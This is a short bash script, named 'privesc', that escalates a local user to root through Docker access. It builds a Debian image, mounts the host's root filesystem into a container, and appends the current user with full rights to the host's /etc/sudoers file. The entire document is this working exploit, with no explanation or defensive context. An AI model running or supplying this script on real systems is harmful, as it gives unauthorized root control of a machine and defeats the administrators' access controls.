#!/bin/bash

my_user=$(whoami)

touch Dockerfile

docker_content="
FROM debian:wheezy

ENV WORKDIR /privesc

RUN mkdir -p $WORKDIR

VOLUME [ $WORKDIR ]

WORKDIR $WORKDIR
"

echo -e "$docker_content" > Dockerfile

docker build -t privesc .

docker run -v /:/privesc -it privesc /bin/bash -c "echo \"$my_user\" ALL=(ALL:ALL) ALL >> /privesc/etc/sudoers"
